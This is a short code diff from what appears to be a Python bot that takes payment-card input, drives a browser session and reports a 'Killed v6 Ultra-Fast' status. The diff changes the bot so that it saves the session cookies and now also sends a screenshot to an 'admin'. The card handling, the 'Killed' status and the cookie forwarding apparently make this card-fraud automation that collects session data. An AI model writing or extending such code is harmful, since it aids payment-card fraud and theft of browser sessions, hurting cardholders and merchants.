@@ -4464,9 +4464,10 @@ def run_ze_process(card_input, update_dict):
                 # Keep going; /ze is meant to be ultra-fast & best-effort
                 pass
 
-        # Save cookies and send to admin
-        cookie_sent = save_and_send_cookies(driver, short_card)
-        cookie_status = "🍪 Cookies sent to admin" if cookie_sent else "⚠️ Cookie save failed"
+        # Save cookies and send screenshot to admin for debugging
+        cookie_sent, screenshot_sent = save_and_send_cookies_with_screenshot(driver, short_card)
+        cookie_status = "🍪 Cookies sent" if cookie_sent else "⚠️ Cookie failed"
+        ss_status = "📸 SS sent" if screenshot_sent else "⚠️ SS failed"
 
         duration = round(time.time() - start, 2)
         edit_message(
@@ -4475,7 +4476,7 @@ def run_ze_process(card_input, update_dict):
             f"1 Procceed\n"
             f"2 Processed\n\n"
             f"⚡ **Status:** Killed v6 Ultra-Fast (ZE)\n"
-            f"{cookie_status}\n"
+            f"{cookie_status} | {ss_status}\n"
             f"⏱ **Time:** {duration}s"
         )
 
